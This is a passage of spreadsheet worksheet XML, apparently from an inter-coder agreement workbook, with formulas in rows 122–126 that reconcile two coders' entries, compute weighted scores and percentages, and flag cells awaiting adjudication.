        <f>IF(COUNT(E122:L122)=0,"",SUM(E122:L122))</f>
        <v/>
      </c>
      <c r="AJ122" s="11">
        <f>IF(AI122="","",N(E122)*3+N(F122)*2+N(G122)*2+N(H122)*2+N(I122)*2+N(J122)*3+N(K122)*3+N(L122)*3)</f>
        <v/>
      </c>
      <c r="AK122" s="11">
        <f>IF(AI122="","",COUNTIF(N122:AG122,1))</f>
        <v/>
      </c>
      <c r="AL122" s="11">
        <f>IF(OR(AJ122="",AJ122=0),"",ROUND(100*(AJ122-AK122)/AJ122,1))</f>
        <v/>
      </c>
      <c r="AM122" s="11">
        <f>IF(AND(Coder1!AN122=1,Coder2!AN122=1),IF(COUNTBLANK(E122:AH122)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN122" s="11">
        <f>IF(AND(Coder1!AN122=1,Coder2!AN122=1),IF(SUMPRODUCT(--(Coder1!E122:AH122&amp;""&lt;&gt;Coder2!E122:AH122&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO122" s="11" t="n"/>
    </row>
    <row r="123">
      <c r="A123" s="11">
        <f>Coder1!A123</f>
        <v/>
      </c>
      <c r="B123" s="11">
        <f>Coder1!B123</f>
        <v/>
      </c>
      <c r="C123" s="11">
        <f>Coder1!C123</f>
        <v/>
      </c>
      <c r="D123" s="11">
        <f>Coder1!D123</f>
        <v/>
      </c>
      <c r="E123" s="14">
        <f>IF(AND(Coder1!E123&amp;""&lt;&gt;"",Coder1!E123&amp;""=Coder2!E123&amp;""),Coder1!E123,"")</f>
        <v/>
      </c>
      <c r="F123" s="14">
        <f>IF(AND(Coder1!F123&amp;""&lt;&gt;"",Coder1!F123&amp;""=Coder2!F123&amp;""),Coder1!F123,"")</f>
        <v/>
      </c>
      <c r="G123" s="14">
        <f>IF(AND(Coder1!G123&amp;""&lt;&gt;"",Coder1!G123&amp;""=Coder2!G123&amp;""),Coder1!G123,"")</f>
        <v/>
      </c>
      <c r="H123" s="14">
        <f>IF(AND(Coder1!H123&amp;""&lt;&gt;"",Coder1!H123&amp;""=Coder2!H123&amp;""),Coder1!H123,"")</f>
        <v/>
      </c>
      <c r="I123" s="14">
        <f>IF(AND(Coder1!I123&amp;""&lt;&gt;"",Coder1!I123&amp;""=Coder2!I123&amp;""),Coder1!I123,"")</f>
        <v/>
      </c>
      <c r="J123" s="14">
        <f>IF(AND(Coder1!J123&amp;""&lt;&gt;"",Coder1!J123&amp;""=Coder2!J123&amp;""),Coder1!J123,"")</f>
        <v/>
      </c>
      <c r="K123" s="14">
        <f>IF(AND(Coder1!K123&amp;""&lt;&gt;"",Coder1!K123&amp;""=Coder2!K123&amp;""),Coder1!K123,"")</f>
        <v/>
      </c>
      <c r="L123" s="14">
        <f>IF(AND(Coder1!L123&amp;""&lt;&gt;"",Coder1!L123&amp;""=Coder2!L123&amp;""),Coder1!L123,"")</f>
        <v/>
      </c>
      <c r="M123" s="14">
        <f>IF(AND(Coder1!M123&amp;""&lt;&gt;"",Coder1!M123&amp;""=Coder2!M123&amp;""),Coder1!M123,"")</f>
        <v/>
      </c>
      <c r="N123" s="14">
        <f>IF(AND(Coder1!N123&amp;""&lt;&gt;"",Coder1!N123&amp;""=Coder2!N123&amp;""),Coder1!N123,"")</f>
        <v/>
      </c>
      <c r="O123" s="14">
        <f>IF(AND(Coder1!O123&amp;""&lt;&gt;"",Coder1!O123&amp;""=Coder2!O123&amp;""),Coder1!O123,"")</f>
        <v/>
      </c>
      <c r="P123" s="14">
        <f>IF(AND(Coder1!P123&amp;""&lt;&gt;"",Coder1!P123&amp;""=Coder2!P123&amp;""),Coder1!P123,"")</f>
        <v/>
      </c>
      <c r="Q123" s="14">
        <f>IF(AND(Coder1!Q123&amp;""&lt;&gt;"",Coder1!Q123&amp;""=Coder2!Q123&amp;""),Coder1!Q123,"")</f>
        <v/>
      </c>
      <c r="R123" s="14">
        <f>IF(AND(Coder1!R123&amp;""&lt;&gt;"",Coder1!R123&amp;""=Coder2!R123&amp;""),Coder1!R123,"")</f>
        <v/>
      </c>
      <c r="S123" s="14">
        <f>IF(AND(Coder1!S123&amp;""&lt;&gt;"",Coder1!S123&amp;""=Coder2!S123&amp;""),Coder1!S123,"")</f>
        <v/>
      </c>
      <c r="T123" s="14">
        <f>IF(AND(Coder1!T123&amp;""&lt;&gt;"",Coder1!T123&amp;""=Coder2!T123&amp;""),Coder1!T123,"")</f>
        <v/>
      </c>
      <c r="U123" s="14">
        <f>IF(AND(Coder1!U123&amp;""&lt;&gt;"",Coder1!U123&amp;""=Coder2!U123&amp;""),Coder1!U123,"")</f>
        <v/>
      </c>
      <c r="V123" s="14">
        <f>IF(AND(Coder1!V123&amp;""&lt;&gt;"",Coder1!V123&amp;""=Coder2!V123&amp;""),Coder1!V123,"")</f>
        <v/>
      </c>
      <c r="W123" s="14">
        <f>IF(AND(Coder1!W123&amp;""&lt;&gt;"",Coder1!W123&amp;""=Coder2!W123&amp;""),Coder1!W123,"")</f>
        <v/>
      </c>
      <c r="X123" s="14">
        <f>IF(AND(Coder1!X123&amp;""&lt;&gt;"",Coder1!X123&amp;""=Coder2!X123&amp;""),Coder1!X123,"")</f>
        <v/>
      </c>
      <c r="Y123" s="14">
        <f>IF(AND(Coder1!Y123&amp;""&lt;&gt;"",Coder1!Y123&amp;""=Coder2!Y123&amp;""),Coder1!Y123,"")</f>
        <v/>
      </c>
      <c r="Z123" s="14">
        <f>IF(AND(Coder1!Z123&amp;""&lt;&gt;"",Coder1!Z123&amp;""=Coder2!Z123&amp;""),Coder1!Z123,"")</f>
        <v/>
      </c>
      <c r="AA123" s="14">
        <f>IF(AND(Coder1!AA123&amp;""&lt;&gt;"",Coder1!AA123&amp;""=Coder2!AA123&amp;""),Coder1!AA123,"")</f>
        <v/>
      </c>
      <c r="AB123" s="14">
        <f>IF(AND(Coder1!AB123&amp;""&lt;&gt;"",Coder1!AB123&amp;""=Coder2!AB123&amp;""),Coder1!AB123,"")</f>
        <v/>
      </c>
      <c r="AC123" s="14">
        <f>IF(AND(Coder1!AC123&amp;""&lt;&gt;"",Coder1!AC123&amp;""=Coder2!AC123&amp;""),Coder1!AC123,"")</f>
        <v/>
      </c>
      <c r="AD123" s="14">
        <f>IF(AND(Coder1!AD123&amp;""&lt;&gt;"",Coder1!AD123&amp;""=Coder2!AD123&amp;""),Coder1!AD123,"")</f>
        <v/>
      </c>
      <c r="AE123" s="14">
        <f>IF(AND(Coder1!AE123&amp;""&lt;&gt;"",Coder1!AE123&amp;""=Coder2!AE123&amp;""),Coder1!AE123,"")</f>
        <v/>
      </c>
      <c r="AF123" s="14">
        <f>IF(AND(Coder1!AF123&amp;""&lt;&gt;"",Coder1!AF123&amp;""=Coder2!AF123&amp;""),Coder1!AF123,"")</f>
        <v/>
      </c>
      <c r="AG123" s="14">
        <f>IF(AND(Coder1!AG123&amp;""&lt;&gt;"",Coder1!AG123&amp;""=Coder2!AG123&amp;""),Coder1!AG123,"")</f>
        <v/>
      </c>
      <c r="AH123" s="14">
        <f>IF(AND(Coder1!AH123&amp;""&lt;&gt;"",Coder1!AH123&amp;""=Coder2!AH123&amp;""),Coder1!AH123,"")</f>
        <v/>
      </c>
      <c r="AI123" s="11">
        <f>IF(COUNT(E123:L123)=0,"",SUM(E123:L123))</f>
        <v/>
      </c>
      <c r="AJ123" s="11">
        <f>IF(AI123="","",N(E123)*3+N(F123)*2+N(G123)*2+N(H123)*2+N(I123)*2+N(J123)*3+N(K123)*3+N(L123)*3)</f>
        <v/>
      </c>
      <c r="AK123" s="11">
        <f>IF(AI123="","",COUNTIF(N123:AG123,1))</f>
        <v/>
      </c>
      <c r="AL123" s="11">
        <f>IF(OR(AJ123="",AJ123=0),"",ROUND(100*(AJ123-AK123)/AJ123,1))</f>
        <v/>
      </c>
      <c r="AM123" s="11">
        <f>IF(AND(Coder1!AN123=1,Coder2!AN123=1),IF(COUNTBLANK(E123:AH123)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN123" s="11">
        <f>IF(AND(Coder1!AN123=1,Coder2!AN123=1),IF(SUMPRODUCT(--(Coder1!E123:AH123&amp;""&lt;&gt;Coder2!E123:AH123&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO123" s="11" t="n"/>
    </row>
    <row r="124">
      <c r="A124" s="11">
        <f>Coder1!A124</f>
        <v/>
      </c>
      <c r="B124" s="11">
        <f>Coder1!B124</f>
        <v/>
      </c>
      <c r="C124" s="11">
        <f>Coder1!C124</f>
        <v/>
      </c>
      <c r="D124" s="11">
        <f>Coder1!D124</f>
        <v/>
      </c>
      <c r="E124" s="14">
        <f>IF(AND(Coder1!E124&amp;""&lt;&gt;"",Coder1!E124&amp;""=Coder2!E124&amp;""),Coder1!E124,"")</f>
        <v/>
      </c>
      <c r="F124" s="14">
        <f>IF(AND(Coder1!F124&amp;""&lt;&gt;"",Coder1!F124&amp;""=Coder2!F124&amp;""),Coder1!F124,"")</f>
        <v/>
      </c>
      <c r="G124" s="14">
        <f>IF(AND(Coder1!G124&amp;""&lt;&gt;"",Coder1!G124&amp;""=Coder2!G124&amp;""),Coder1!G124,"")</f>
        <v/>
      </c>
      <c r="H124" s="14">
        <f>IF(AND(Coder1!H124&amp;""&lt;&gt;"",Coder1!H124&amp;""=Coder2!H124&amp;""),Coder1!H124,"")</f>
        <v/>
      </c>
      <c r="I124" s="14">
        <f>IF(AND(Coder1!I124&amp;""&lt;&gt;"",Coder1!I124&amp;""=Coder2!I124&amp;""),Coder1!I124,"")</f>
        <v/>
      </c>
      <c r="J124" s="14">
        <f>IF(AND(Coder1!J124&amp;""&lt;&gt;"",Coder1!J124&amp;""=Coder2!J124&amp;""),Coder1!J124,"")</f>
        <v/>
      </c>
      <c r="K124" s="14">
        <f>IF(AND(Coder1!K124&amp;""&lt;&gt;"",Coder1!K124&amp;""=Coder2!K124&amp;""),Coder1!K124,"")</f>
        <v/>
      </c>
      <c r="L124" s="14">
        <f>IF(AND(Coder1!L124&amp;""&lt;&gt;"",Coder1!L124&amp;""=Coder2!L124&amp;""),Coder1!L124,"")</f>
        <v/>
      </c>
      <c r="M124" s="14">
        <f>IF(AND(Coder1!M124&amp;""&lt;&gt;"",Coder1!M124&amp;""=Coder2!M124&amp;""),Coder1!M124,"")</f>
        <v/>
      </c>
      <c r="N124" s="14">
        <f>IF(AND(Coder1!N124&amp;""&lt;&gt;"",Coder1!N124&amp;""=Coder2!N124&amp;""),Coder1!N124,"")</f>
        <v/>
      </c>
      <c r="O124" s="14">
        <f>IF(AND(Coder1!O124&amp;""&lt;&gt;"",Coder1!O124&amp;""=Coder2!O124&amp;""),Coder1!O124,"")</f>
        <v/>
      </c>
      <c r="P124" s="14">
        <f>IF(AND(Coder1!P124&amp;""&lt;&gt;"",Coder1!P124&amp;""=Coder2!P124&amp;""),Coder1!P124,"")</f>
        <v/>
      </c>
      <c r="Q124" s="14">
        <f>IF(AND(Coder1!Q124&amp;""&lt;&gt;"",Coder1!Q124&amp;""=Coder2!Q124&amp;""),Coder1!Q124,"")</f>
        <v/>
      </c>
      <c r="R124" s="14">
        <f>IF(AND(Coder1!R124&amp;""&lt;&gt;"",Coder1!R124&amp;""=Coder2!R124&amp;""),Coder1!R124,"")</f>
        <v/>
      </c>
      <c r="S124" s="14">
        <f>IF(AND(Coder1!S124&amp;""&lt;&gt;"",Coder1!S124&amp;""=Coder2!S124&amp;""),Coder1!S124,"")</f>
        <v/>
      </c>
      <c r="T124" s="14">
        <f>IF(AND(Coder1!T124&amp;""&lt;&gt;"",Coder1!T124&amp;""=Coder2!T124&amp;""),Coder1!T124,"")</f>
        <v/>
      </c>
      <c r="U124" s="14">
        <f>IF(AND(Coder1!U124&amp;""&lt;&gt;"",Coder1!U124&amp;""=Coder2!U124&amp;""),Coder1!U124,"")</f>
        <v/>
      </c>
      <c r="V124" s="14">
        <f>IF(AND(Coder1!V124&amp;""&lt;&gt;"",Coder1!V124&amp;""=Coder2!V124&amp;""),Coder1!V124,"")</f>
        <v/>
      </c>
      <c r="W124" s="14">
        <f>IF(AND(Coder1!W124&amp;""&lt;&gt;"",Coder1!W124&amp;""=Coder2!W124&amp;""),Coder1!W124,"")</f>
        <v/>
      </c>
      <c r="X124" s="14">
        <f>IF(AND(Coder1!X124&amp;""&lt;&gt;"",Coder1!X124&amp;""=Coder2!X124&amp;""),Coder1!X124,"")</f>
        <v/>
      </c>
      <c r="Y124" s="14">
        <f>IF(AND(Coder1!Y124&amp;""&lt;&gt;"",Coder1!Y124&amp;""=Coder2!Y124&amp;""),Coder1!Y124,"")</f>
        <v/>
      </c>
      <c r="Z124" s="14">
        <f>IF(AND(Coder1!Z124&amp;""&lt;&gt;"",Coder1!Z124&amp;""=Coder2!Z124&amp;""),Coder1!Z124,"")</f>
        <v/>
      </c>
      <c r="AA124" s="14">
        <f>IF(AND(Coder1!AA124&amp;""&lt;&gt;"",Coder1!AA124&amp;""=Coder2!AA124&amp;""),Coder1!AA124,"")</f>
        <v/>
      </c>
      <c r="AB124" s="14">
        <f>IF(AND(Coder1!AB124&amp;""&lt;&gt;"",Coder1!AB124&amp;""=Coder2!AB124&amp;""),Coder1!AB124,"")</f>
        <v/>
      </c>
      <c r="AC124" s="14">
        <f>IF(AND(Coder1!AC124&amp;""&lt;&gt;"",Coder1!AC124&amp;""=Coder2!AC124&amp;""),Coder1!AC124,"")</f>
        <v/>
      </c>
      <c r="AD124" s="14">
        <f>IF(AND(Coder1!AD124&amp;""&lt;&gt;"",Coder1!AD124&amp;""=Coder2!AD124&amp;""),Coder1!AD124,"")</f>
        <v/>
      </c>
      <c r="AE124" s="14">
        <f>IF(AND(Coder1!AE124&amp;""&lt;&gt;"",Coder1!AE124&amp;""=Coder2!AE124&amp;""),Coder1!AE124,"")</f>
        <v/>
      </c>
      <c r="AF124" s="14">
        <f>IF(AND(Coder1!AF124&amp;""&lt;&gt;"",Coder1!AF124&amp;""=Coder2!AF124&amp;""),Coder1!AF124,"")</f>
        <v/>
      </c>
      <c r="AG124" s="14">
        <f>IF(AND(Coder1!AG124&amp;""&lt;&gt;"",Coder1!AG124&amp;""=Coder2!AG124&amp;""),Coder1!AG124,"")</f>
        <v/>
      </c>
      <c r="AH124" s="14">
        <f>IF(AND(Coder1!AH124&amp;""&lt;&gt;"",Coder1!AH124&amp;""=Coder2!AH124&amp;""),Coder1!AH124,"")</f>
        <v/>
      </c>
      <c r="AI124" s="11">
        <f>IF(COUNT(E124:L124)=0,"",SUM(E124:L124))</f>
        <v/>
      </c>
      <c r="AJ124" s="11">
        <f>IF(AI124="","",N(E124)*3+N(F124)*2+N(G124)*2+N(H124)*2+N(I124)*2+N(J124)*3+N(K124)*3+N(L124)*3)</f>
        <v/>
      </c>
      <c r="AK124" s="11">
        <f>IF(AI124="","",COUNTIF(N124:AG124,1))</f>
        <v/>
      </c>
      <c r="AL124" s="11">
        <f>IF(OR(AJ124="",AJ124=0),"",ROUND(100*(AJ124-AK124)/AJ124,1))</f>
        <v/>
      </c>
      <c r="AM124" s="11">
        <f>IF(AND(Coder1!AN124=1,Coder2!AN124=1),IF(COUNTBLANK(E124:AH124)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN124" s="11">
        <f>IF(AND(Coder1!AN124=1,Coder2!AN124=1),IF(SUMPRODUCT(--(Coder1!E124:AH124&amp;""&lt;&gt;Coder2!E124:AH124&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO124" s="11" t="n"/>
    </row>
    <row r="125">
      <c r="A125" s="11">
        <f>Coder1!A125</f>
        <v/>
      </c>
      <c r="B125" s="11">
        <f>Coder1!B125</f>
        <v/>
      </c>
      <c r="C125" s="11">
        <f>Coder1!C125</f>
        <v/>
      </c>
      <c r="D125" s="11">
        <f>Coder1!D125</f>
        <v/>
      </c>
      <c r="E125" s="14">
        <f>IF(AND(Coder1!E125&amp;""&lt;&gt;"",Coder1!E125&amp;""=Coder2!E125&amp;""),Coder1!E125,"")</f>
        <v/>
      </c>
      <c r="F125" s="14">
        <f>IF(AND(Coder1!F125&amp;""&lt;&gt;"",Coder1!F125&amp;""=Coder2!F125&amp;""),Coder1!F125,"")</f>
        <v/>
      </c>
      <c r="G125" s="14">
        <f>IF(AND(Coder1!G125&amp;""&lt;&gt;"",Coder1!G125&amp;""=Coder2!G125&amp;""),Coder1!G125,"")</f>
        <v/>
      </c>
      <c r="H125" s="14">
        <f>IF(AND(Coder1!H125&amp;""&lt;&gt;"",Coder1!H125&amp;""=Coder2!H125&amp;""),Coder1!H125,"")</f>
        <v/>
      </c>
      <c r="I125" s="14">
        <f>IF(AND(Coder1!I125&amp;""&lt;&gt;"",Coder1!I125&amp;""=Coder2!I125&amp;""),Coder1!I125,"")</f>
        <v/>
      </c>
      <c r="J125" s="14">
        <f>IF(AND(Coder1!J125&amp;""&lt;&gt;"",Coder1!J125&amp;""=Coder2!J125&amp;""),Coder1!J125,"")</f>
        <v/>
      </c>
      <c r="K125" s="14">
        <f>IF(AND(Coder1!K125&amp;""&lt;&gt;"",Coder1!K125&amp;""=Coder2!K125&amp;""),Coder1!K125,"")</f>
        <v/>
      </c>
      <c r="L125" s="14">
        <f>IF(AND(Coder1!L125&amp;""&lt;&gt;"",Coder1!L125&amp;""=Coder2!L125&amp;""),Coder1!L125,"")</f>
        <v/>
      </c>
      <c r="M125" s="14">
        <f>IF(AND(Coder1!M125&amp;""&lt;&gt;"",Coder1!M125&amp;""=Coder2!M125&amp;""),Coder1!M125,"")</f>
        <v/>
      </c>
      <c r="N125" s="14">
        <f>IF(AND(Coder1!N125&amp;""&lt;&gt;"",Coder1!N125&amp;""=Coder2!N125&amp;""),Coder1!N125,"")</f>
        <v/>
      </c>
      <c r="O125" s="14">
        <f>IF(AND(Coder1!O125&amp;""&lt;&gt;"",Coder1!O125&amp;""=Coder2!O125&amp;""),Coder1!O125,"")</f>
        <v/>
      </c>
      <c r="P125" s="14">
        <f>IF(AND(Coder1!P125&amp;""&lt;&gt;"",Coder1!P125&amp;""=Coder2!P125&amp;""),Coder1!P125,"")</f>
        <v/>
      </c>
      <c r="Q125" s="14">
        <f>IF(AND(Coder1!Q125&amp;""&lt;&gt;"",Coder1!Q125&amp;""=Coder2!Q125&amp;""),Coder1!Q125,"")</f>
        <v/>
      </c>
      <c r="R125" s="14">
        <f>IF(AND(Coder1!R125&amp;""&lt;&gt;"",Coder1!R125&amp;""=Coder2!R125&amp;""),Coder1!R125,"")</f>
        <v/>
      </c>
      <c r="S125" s="14">
        <f>IF(AND(Coder1!S125&amp;""&lt;&gt;"",Coder1!S125&amp;""=Coder2!S125&amp;""),Coder1!S125,"")</f>
        <v/>
      </c>
      <c r="T125" s="14">
        <f>IF(AND(Coder1!T125&amp;""&lt;&gt;"",Coder1!T125&amp;""=Coder2!T125&amp;""),Coder1!T125,"")</f>
        <v/>
      </c>
      <c r="U125" s="14">
        <f>IF(AND(Coder1!U125&amp;""&lt;&gt;"",Coder1!U125&amp;""=Coder2!U125&amp;""),Coder1!U125,"")</f>
        <v/>
      </c>
      <c r="V125" s="14">
        <f>IF(AND(Coder1!V125&amp;""&lt;&gt;"",Coder1!V125&amp;""=Coder2!V125&amp;""),Coder1!V125,"")</f>
        <v/>
      </c>
      <c r="W125" s="14">
        <f>IF(AND(Coder1!W125&amp;""&lt;&gt;"",Coder1!W125&amp;""=Coder2!W125&amp;""),Coder1!W125,"")</f>
        <v/>
      </c>
      <c r="X125" s="14">
        <f>IF(AND(Coder1!X125&amp;""&lt;&gt;"",Coder1!X125&amp;""=Coder2!X125&amp;""),Coder1!X125,"")</f>
        <v/>
      </c>
      <c r="Y125" s="14">
        <f>IF(AND(Coder1!Y125&amp;""&lt;&gt;"",Coder1!Y125&amp;""=Coder2!Y125&amp;""),Coder1!Y125,"")</f>
        <v/>
      </c>
      <c r="Z125" s="14">
        <f>IF(AND(Coder1!Z125&amp;""&lt;&gt;"",Coder1!Z125&amp;""=Coder2!Z125&amp;""),Coder1!Z125,"")</f>
        <v/>
      </c>
      <c r="AA125" s="14">
        <f>IF(AND(Coder1!AA125&amp;""&lt;&gt;"",Coder1!AA125&amp;""=Coder2!AA125&amp;""),Coder1!AA125,"")</f>
        <v/>
      </c>
      <c r="AB125" s="14">
        <f>IF(AND(Coder1!AB125&amp;""&lt;&gt;"",Coder1!AB125&amp;""=Coder2!AB125&amp;""),Coder1!AB125,"")</f>
        <v/>
      </c>
      <c r="AC125" s="14">
        <f>IF(AND(Coder1!AC125&amp;""&lt;&gt;"",Coder1!AC125&amp;""=Coder2!AC125&amp;""),Coder1!AC125,"")</f>
        <v/>
      </c>
      <c r="AD125" s="14">
        <f>IF(AND(Coder1!AD125&amp;""&lt;&gt;"",Coder1!AD125&amp;""=Coder2!AD125&amp;""),Coder1!AD125,"")</f>
        <v/>
      </c>
      <c r="AE125" s="14">
        <f>IF(AND(Coder1!AE125&amp;""&lt;&gt;"",Coder1!AE125&amp;""=Coder2!AE125&amp;""),Coder1!AE125,"")</f>
        <v/>
      </c>
      <c r="AF125" s="14">
        <f>IF(AND(Coder1!AF125&amp;""&lt;&gt;"",Coder1!AF125&amp;""=Coder2!AF125&amp;""),Coder1!AF125,"")</f>
        <v/>
      </c>
      <c r="AG125" s="14">
        <f>IF(AND(Coder1!AG125&amp;""&lt;&gt;"",Coder1!AG125&amp;""=Coder2!AG125&amp;""),Coder1!AG125,"")</f>
        <v/>
      </c>
      <c r="AH125" s="14">
        <f>IF(AND(Coder1!AH125&amp;""&lt;&gt;"",Coder1!AH125&amp;""=Coder2!AH125&amp;""),Coder1!AH125,"")</f>
        <v/>
      </c>
      <c r="AI125" s="11">
        <f>IF(COUNT(E125:L125)=0,"",SUM(E125:L125))</f>
        <v/>
      </c>
      <c r="AJ125" s="11">
        <f>IF(AI125="","",N(E125)*3+N(F125)*2+N(G125)*2+N(H125)*2+N(I125)*2+N(J125)*3+N(K125)*3+N(L125)*3)</f>
        <v/>
      </c>
      <c r="AK125" s="11">
        <f>IF(AI125="","",COUNTIF(N125:AG125,1))</f>
        <v/>
      </c>
      <c r="AL125" s="11">
        <f>IF(OR(AJ125="",AJ125=0),"",ROUND(100*(AJ125-AK125)/AJ125,1))</f>
        <v/>
      </c>
      <c r="AM125" s="11">
        <f>IF(AND(Coder1!AN125=1,Coder2!AN125=1),IF(COUNTBLANK(E125:AH125)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN125" s="11">
        <f>IF(AND(Coder1!AN125=1,Coder2!AN125=1),IF(SUMPRODUCT(--(Coder1!E125:AH125&amp;""&lt;&gt;Coder2!E125:AH125&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO125" s="11" t="n"/>
    </row>
    <row r="126">
      <c r="A126" s="11">
        <f>Coder1!A126</f>
        <v/>
      </c>
      <c r="B126" s="11">
        <f>Coder1!B126</f>
        <v/>
      </c>
      <c r="C126" s="11">
        <f>Coder1!C126</f>
        <v/>
      </c>
      <c r="D126" s="11">
        <f>Coder1!D126</f>
        <v/>
      </c>
      <c r="E126" s="14">
        <f>IF(AND(Coder1!E126&amp;""&lt;&gt;"",Coder1!E126&amp;""=Coder2!E126&amp;""),Coder1!E126,"")</f>
        <v/>
      </c>
      <c r="F126" s="14">
        <f>IF(AND(Coder1!F126&amp;""&lt;&gt;"",Coder1!F126&amp;""=Coder2!F126&amp;""),Coder1!F126,"")</f>
        <v/>
      </c>
      <c r="G126" s="14">
        <f>IF(AND(Coder1!G126&amp;""&lt;&gt;"",Coder1!G126&amp;""=Coder2!G126&amp;""),Coder1!G126,"")</f>
        <v/>
      </c>
      <c r="H126" s="14">
        <f>IF(AND(Coder1!H126&amp;""&lt;&gt;"",Coder1!H126&amp;""=Coder2!H126&amp;""),Coder1!H126,"")</f>
        <v/>
      </c>
      <c r="I126" s="14">
        <f>IF(AND(Coder1!I126&amp;""&lt;&gt;"",Coder1!I126&amp;""=Coder2!I126&amp;""),Coder1!I126,"")</f>
        <v/>
      </c>
      <c r="J126" s="14">
        <f>IF(AND(Coder1!J126&amp;""&lt;&gt;"",Coder1!J126&amp;""=Coder2!J126&amp;""),Coder1!J126,"")</f>
        <v/>
      </c>
      <c r="K126" s="14">
        <f>IF(AND(Coder1!K126&amp;""&lt;&gt;"",Coder1!K126&amp;""=Coder2!K126&amp;""),Coder1!K126,"")</f>
        <v/>
      </c>
      <c r="L126" s="14">
        <f>IF(AND(Coder1!L126&amp;""&lt;&gt;"",Coder1!L126&amp;""=Coder2!L126&amp;""),Coder1!L126,"")</f>
        <v/>
      </c>
      <c r="M126" s="14">
        <f>IF(AND(Coder1!M126&amp;""&lt;&gt;"",Coder1!M126&amp;""=Coder2!M126&amp;""),Coder1!M126,"")</f>
        <v/>
      </c>
      <c r="N126" s="14">
        <f>IF(AND(Coder1!N126&amp;""&lt;&gt;"",Coder1!N126&amp;""=Coder2!N126&amp;""),Coder1!N126,"")</f>
        <v/>
      </c>
      <c r="O126" s="14">
        <f>IF(AND(Coder1!O126&amp;""&lt;&gt;"",Coder1!O126&amp;""=Coder2!O126&amp;""),Coder1!O126,"")</f>
        <v/>
      </c>
      <c r="P126" s="14">
        <f>IF(AND(Coder1!P126&amp;""&lt;&gt;"",Coder1!P126&amp;""=Coder2!P126&amp;""),Coder1!P126,"")</f>
        <v/>
      </c>
      <c r="Q126" s="14">
        <f>IF(AND(Coder1!Q126&amp;""&lt;&gt;"",Coder1!Q126&amp;""=Coder2!Q126&amp;""),Coder1!Q126,"")</f>
        <v/>
      </c>
      <c r="R126" s="14">
        <f>IF(AND(Coder1!R126&amp;""&lt;&gt;"",Coder1!R126&amp;""=Coder2!R126&amp;""),Coder1!R126,"")</f>
        <v/>
      </c>
      <c r="S126" s="14">
        <f>IF(AND(Coder1!S126&amp;""&lt;&gt;"",Coder1!S126&amp;""=Coder2!S126&amp;""),Coder1!S126,"")</f>
        <v/>
      </c>
      <c r="T126" s="14">
        <f>IF(AND(Coder1!T126&amp;""&lt;&gt;"",Coder1!T126&amp;""=Coder2!T126&amp;""),Coder1!T126,"")</f>
        <v/>
      </c>
      <c r="U126" s="14">
        <f>IF(AND(Coder1!U126&amp;""&lt;&gt;"",Coder1!U126&amp;""=Coder2!U126&amp;""),Coder1!U126,"")</f>
        <v/>
      </c>
      <c r="V126" s="14">
        <f>IF(AND(Coder1!V126&amp;""&lt;&gt;"",Coder1!V126&amp;""=Coder2!V126&amp;""),Coder1!V126,"")</f>
        <v/>
      </c>
      <c r="W126" s="14">
        <f>IF(AND(Coder1!W126&amp;""&lt;&gt;"",Coder1!W126&amp;""=Coder2!W126&amp;""),Coder1!W126,"")</f>
        <v/>
      </c>
      <c r="X126" s="14">
        <f>IF(AND(Coder1!X126&amp;""&lt;&gt;"",Coder1!X126&amp;""=Coder2!X126&amp;""),Coder1!X126,"")</f>
        <v/>
      </c>
      <c r="Y126" s="14">
        <f>IF(AND(Coder1!Y126&amp;""&lt;&gt;"",Coder1!Y126&amp;""=Coder2!Y126&amp;""),Coder1!Y126,"")</f>
        <v/>
      </c>
      <c r="Z126" s="14">
        <f>IF(AND(Coder1!Z126&amp;""&lt;&gt;"",Coder1!Z126&amp;""=Coder2!Z126&amp;""),Coder1!Z126,"")</f>
        <v/>
      </c>
      <c r="AA126" s="14">
        <f>IF(AND(Coder1!AA126&amp;""&lt;&gt;"",Coder1!AA126&amp;""=Coder2!AA126&amp;""),Coder1!AA126,"")</f>
        <v/>
      </c>
      <c r="AB126" s="14">
        <f>IF(AND(Coder1!AB126&amp;""&lt;&gt;"",Coder1!AB126&amp;""=Coder2!AB126&amp;""),Coder1!AB126,"")</f>
        <v/>
      </c>
      <c r="AC126" s="14">
        <f>IF(AND(Coder1!AC126&amp;""&lt;&gt;"",Coder1!AC126&amp;""=Coder2!AC126&amp;""),Coder1!AC126,"")</f>
        <v/>
      </c>
      <c r="AD126" s="14">
        <f>IF(AND(Coder1!AD126&amp;""&lt;&gt;"",Coder1!AD126&amp;""=Coder2!AD126&amp;""),Coder1!AD126,"")</f>
        <v/>
      </c>
      <c r="AE126" s="14">
        <f>IF(AND(Coder1!AE126&amp;""&lt;&gt;"",Coder1!AE126&amp;""=Coder2!AE126&amp;""),Coder1!AE126,"")</f>
        <v/>
      </c>
      <c r="AF126" s="14">
        <f>IF(AND(Coder1!AF126&amp;""&lt;&gt;"",Coder1!AF126&amp;""=Coder2!AF126&amp;""),Coder1!AF126,"")</f>
        <v/>
      </c>
      <c r="AG126" s="14">
        <f>IF(AND(Coder1!AG126&amp;""&lt;&gt;"",Coder1!AG126&amp;""=Coder2!AG126&amp;""),Coder1!AG126,"")</f>
        <v/>
      </c>
      <c r="AH126" s="14">
        <f>IF(AND(Coder1!AH126&amp;""&lt;&gt;"",Coder1!AH126&amp;""=Coder2!AH126&amp;""),Coder1!AH126,"")</f>
        <v/>
      </c>
      <c r="AI126" s="11">
        <f>IF(COUNT(E126:L126)=0,"",SUM(E126:L126))</f>
        <v/>
      </c>
      <c r="AJ126" s="11">
        <f>IF(AI126="","",N(E126)*3+N(F126)*2+N(G126)*2+N(H126)*2+N(I126)*2+N(J126)*3+N(K126)*3+N(L126)*3)</f>
        <v/>
      </c>
      <c r="AK126" s="11">
        <f>IF(AI126="","",COUNTIF(N126:AG126,1))</f>
        <v/>
      </c>
      <c r="AL126" s="11">
        <f>IF(OR(AJ126="",AJ126=0),"",ROUND(100*(AJ126-AK126)/AJ126,1))</f>
        <v/>
      </c>
      <c r="AM126" s="11">
